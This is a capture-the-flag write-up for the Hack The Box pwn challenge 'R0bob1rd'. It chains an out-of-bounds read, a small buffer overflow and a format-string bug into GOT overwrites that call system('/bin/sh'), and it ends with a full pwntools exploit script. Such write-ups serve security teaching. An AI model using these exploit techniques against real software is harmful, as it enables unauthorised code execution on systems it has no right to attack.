---
title: R0bob1rd
description: Writeup for the R0bob1rd challenge HackTheBox
tags: htb, pwn, easy
---

R0bob1rd is a pwn challenge on Hack the Box.

## Recon & Initial Analysis

First of all, I started by checking what we are dealing with. Running `file`, I found out that we have a classic x86_64 Userspace Binary. All security measures are activated except **PIE**, which will simplify things a lot. Also with the binary, the author provides us with the libc versions needed to solve the challenge. This is usually a huge indicator that we somehow will need a **ret2libc** exploit or something similar.

After doing the initial routine checks, I started with reversing the binary in **Ghidra**. There is really only one function that does interesting stuff, which is the `operation` function. Manually cleaned up, the function looks something like this:

```c
extern char *robobirdNames[];

void operation(void) 
{
    long in_FS_OFFSET;
    long canary = *(long *)(in_FS_OFFSET + 0x28);
    
    int selection;
    char desc_buffer[104];
    
    printf("\nSelect a R0bob1rd > ");
    fflush(stdout);
    scanf("%d", &selection);
    
    if (selection < 0 || selection > 9) {
        printf("\nYou've chosen: %s", (char *)&robobirdNames[selection]);
    } else {
        printf("\nYou've chosen: %s", robobirdNames[selection]);
    }
    getchar();
    puts("\n\nEnter bird's little description");
    printf("> ");
    fgets(desc_buffer, 106, stdin);
    puts("Crafting..");
    usleep(2000000);
    start_screen();
    puts("[Description]");
    printf(desc_buffer);
    
    if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
}
```

(I kept the canary check in, because it will become important later...)

The function does the following:

1. Ask the user to choose a Robobird (number between 0 and 9)
2. Print the user's selection
3. Ask the user to input a description
4. Wait and print an ascii art
5. Print the description
6. Check if the stack was smashed via the canary

After scanning the code and playing around with it a bit, there are 3 major vulnerabilities we can exploit:

### 1. OOB Read 
In the first selection of the Robobird. The check if the selection is between 0 and 9 completely fails. To be honest, you can't even call it a check. It just prints the data at a specific address when a number outside of 0-9 is entered. This results in a leak, where we can leak anything in the binary.
```c
    if (selection < 0 || selection > 9) {
        // OOB Read
        printf("\nYou've chosen: %s", (char *)&robobirdNames[selection]);
    } else {
        printf("\nYou've chosen: %s", robobirdNames[selection]);
    }
```
### 2. Buffer Overflow 
The second vulnerability is a **buffer overflow** in the description buffer. The buffer is 104 bytes long, but the `fgets` call accepts 106 bytes. This is a really small buffer overflow, which won't allow us to hijack control flow, but it will get very handy later on.
```c
char desc_buffer[104];
...
fgets(desc_buffer, 106, stdin);
```

### 3. Format-String Vulnerability
The last vulnerability is a classic **format string vulnerability**. The description buffer is passed as a first argument to the `printf` function. That means that the buffer is interpreted as a format string, which we can utilize to write to any address we want. 

```c
printf(desc_buffer);
```
## Developing the Exploit

To hijack control flow and finally pop a shell, we need to chain all the vulnerabilities we discovered above together. The first one is only an **OOB read**, which will give us information, but we can't hijack control flow with only reading data. The second bug, the overflow, lets us only overwrite a portion of the canary, but nothing else, resulting in a program abort. And finally, our last piece, the format string bug, enables us to write.

A classic technique to hijack control flow with a format string vulnerability is to overwrite a **Global Offset Table** (**GOT**) entry of a libc function which is called *after* the `printf` call, something like `puts` or `strcmp`.
The *Global Offset Table* is a section in the elf file that stores the different addresses for the libc functions they have at runtime. Since modern systems use **ASLR**, the addresses of each libc function differ each run, so the compiler can't hardcode them in at compile time. Instead, the compiler calls a small stub in a thing called the *Procedure Linkage Table* (**PLT**) when a libc function should be called. This small stub asks the dynamic linker for the current runtime address of the desired libc function when it's called first. The address is then written to the **GOT**, so the dynamic linker doesn't have to be asked again for future calls to the just-called function. 

The idea is to use the `printf` **OOB write** to overwrite the address in the **GOT** for a function, for example `puts`, that is called after our `printf` call. When `puts` is then called in the assembly, the execution isn't really directed to `puts`, but to *our* address we just wrote into the **GOT**. This was only a very brief, and probably not so good explanation. If you want to learn more about this, I highly recommend [this article](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html). I also won't go into detail about how exactly the **OOB write** with the `printf` bug works because this would be too much for this writeup. If you want to read about it, I can recommend [this article](https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html) and also the chapter on it in *The Shellcoder's Handbook* by Chris Anley et al.

Now after this short detour, let's continue with our exploit:

The only libc function which is called after the `printf` vulnerability is `__stack_chk_fail()`, which will terminate our program with a *** Stack smashing detected *** message if our stack canary got corrupted. We can chain together our vulnerability #2 to trigger this corruption, while also using our `printf` vulnerability right before to overwrite the address of a different function into the **GOT** entry of `__stack_chk_fail()`.

But where do we jump to? If we want to pop a shell at the end or execute arbitrary commands, the best pick is the `system` function. The only problem is that at this point, we have no idea what the address of this function is. Our binary has **PIE** disabled, but the libc binaries still have **PIE** enabled. So we somehow have to leak the address of `system` at runtime. Luckily, we have our first vulnerability still up our sleeve! If we manage to leak some runtime address of a libc function, we can calculate the base of our libc binary in memory and then calculate every other address of any other function, like our desired `system` function.

### Utilizing the Leak
To calculate the base address we have to do the following. First we will need to calculate the difference between the `robobirdNames` variable and any libc function's **GOT** entry. After we calculate this difference, we know what we need to put into the robobird selection so that we leak our desired libc address. In python it looks like this (the whole exploit can be found at the end):

```python
delta = (printf_got - bird_names_addr) // 8
proc.sendline(str(delta).encode())
```

Now we can extract the leaked address:
```python
line = proc.recvline()
prefix = b"You've chosen: "
start_index = line.find(prefix) + len(prefix)
printf_leak_raw = line[start_index:].rstrip("\n")
printf_leak = pwn.u64(printf_leak_raw.ljust(8, b"\x00"))
pwn.success(fr"printf address: {hex(printf_leak)}")
```

With that information, we can calculate our libc base. To do that we need to subtract the offset of `printf` from the leaked address. This will result in the currently **ASLR**'d libc base. And with that information, we can calculate the address of `system` (by adding its offset to the just calculated base):
```python
libc.address = printf_leak - libc.symbols["printf"]
system = libc.symbols["system"]
```

### Overwriting Addresses and Jumping Around

We now have the needed info, so we can write the address of `system` anywhere. But where? To answer this question, we need to ask ourselves the following questions:

Which function is called after `printf`?

The answer is only `__stack_chk_fail()` (if the canary is corrupted). The problem with `__stack_chk_fail()` is that it doesn't take any arguments. So the first parameter of `system` will be whatever is left in the `rdi` register. At this point, this will be a pointer to our `desc_buffer`. So this will not be really useful. We need to call a function where we control the first argument. 

This is where I got a little bit stuck in the challenge. I couldn't really wrap my mind around which function I can hijack. But after some time staring at the code and thinking really hard, I eventually figured it out. 
The only function satisfying this condition is the call to `printf`. So to be able to call `printf` after it's overwritten, we need to overwrite the **GOT** entry of `__stack_chk_fail()` not with the address of `system`, but with the address of the `operation` function we are *currently* in. And `printf` gets overwritten with `system`. We route our control flow back to the beginning so that we get another chance to call to `printf`, which is now `system`. 


We can use pwntools to overwrite the two addresses in one `printf` call:

```python
writes = {
    stack_chk_got: operation_addr, # to jump back
    printf_got: system
}
payload = pwn.fmtstr_payload(8, writes, write_size='short')
```

With this in place, we can overflow by giving our payload a little extra padding, triggering `__stack_chk_fail()`:


```python
padding = buffer_size - len(payload) - 1 # -1 since fgets will add a \x00 at the end. If we send the full buffer, our last byte will not end up in the buffer but will be stuck in stdin and then reused by scanf the next time resulting in a crash
payload += b'A'*padding
proc.send(payload)
```

After sending our payload, control flow will route us back to the start of `operation`, but now all our traps are in place. We just need to provide any input to the first `scanf`, and then our next input will be passed into `system`. That's why we will just send "/bin/sh" and we have a shell:

```python
proc.sendline(b"1") # send a valid choice
proc.sendline(b"/bin/sh") # fill our buffer with the parameter for system
``` 

This whole control flow of the final exploit can be a bit mind bending at first (at least it was for me) so here's a little visualization of it:

![[r0bob1rd.drawio.png]]

With that in place we can run our exploit against the remote target, get our shell and read the flag.

### Thoughts and Takeaways

I think I don't have to explain what went wrong here, and how to mitigate those issues. Those are really just classic vulnerabilities. What I think is really interesting about this challenge is that you are forced to use them all together, and build an **exploit chain** so that every vulnerability plays into the cards of the other. I really had a blast doing this challenge and figuring all the different bits out. 

If you read this far, thank you! I hope you maybe learned something along the way.

### Final Exploit Script

```python
import pwn

pwn.context.terminal = ['kitty', '-e']
pwn.context.arch = "amd64"
pwn.context.log_level = "info"

elf = pwn.ELF("./r0bob1rd")
libc = pwn.ELF("./glibc/libc.so.6")
proc = pwn.process("./r0bob1rd")

stack_chk_got = elf.got["__stack_chk_fail"]
printf_got = elf.got["printf"]
operation_addr = elf.symbols["operation"]
bird_names_addr = elf.symbols["robobirdNames"]

### STAGE 1 ###
pwn.info("Starting stage one...")
proc.recvuntil(b"Select a R0bob1rd > ")
# 1. Leak printf libc address
delta = (printf_got - bird_names_addr) // 8
proc.sendline(str(delta).encode())
proc.recvline()

# Extract leaked address
line = proc.recvline()
prefix = b"You've chosen: "
start_index = line.find(prefix) + len(prefix)
printf_leak_raw = line[start_index:].rstrip(b"\n") #Make sure to use rstrip not strip so that \x20 bytes doesn't get truncated accidentally
printf_leak = pwn.u64(printf_leak_raw.ljust(8, b"\x00"))
pwn.success(fr"printf address: {hex(printf_leak)}")

# calculate libc base
libc.address = printf_leak - libc.symbols["printf"]
pwn.success((f"Libc Base: {hex(libc.address)}"))
system = libc.symbols["system"]
pwn.info(f"System: {hex(system)}")

pwn.info("Overwriting _stack_chk_fail (got) with address of operation")
pwn.info("Overwriting printf (got) with address of system")

# 2. Overwrite got entry of stack check and printf
writes = {
    stack_chk_got: operation_addr, # to jump back
    printf_got: system
}

buffer_size = 0x6a
payload = pwn.fmtstr_payload(8, writes, write_size='short')

# 3. Trigger stack canary
# Add enough padding to overflow the buffer so we trigger the stack canary
# and loop back to the start of `operation`
padding = buffer_size - len(payload) - 1 # -1 since fgets will add a \x00 at the end. If we send the full buffer, our last byte will not end up in the buffer but will be stuck in stdin and then reused by scanf the next time resulting in a crash
payload += b'A'*padding

pwn.info("Sending stage 1 payload...")
proc.send(payload)

### STAGE 2 ###
# clean up input stream
proc.recvuntil(b"Select a R0bob1rd > ")
pwn.success("Stage 1 successful, starting stage 2...")

proc.sendline(b"1") # send a valid choice
proc.sendline(b"/bin/sh") # fill our buffer with the parameter for system

proc.recvuntil(b"[Description]") # clean up input buffer
pwn.success("Success!\n")
proc.interactive()
```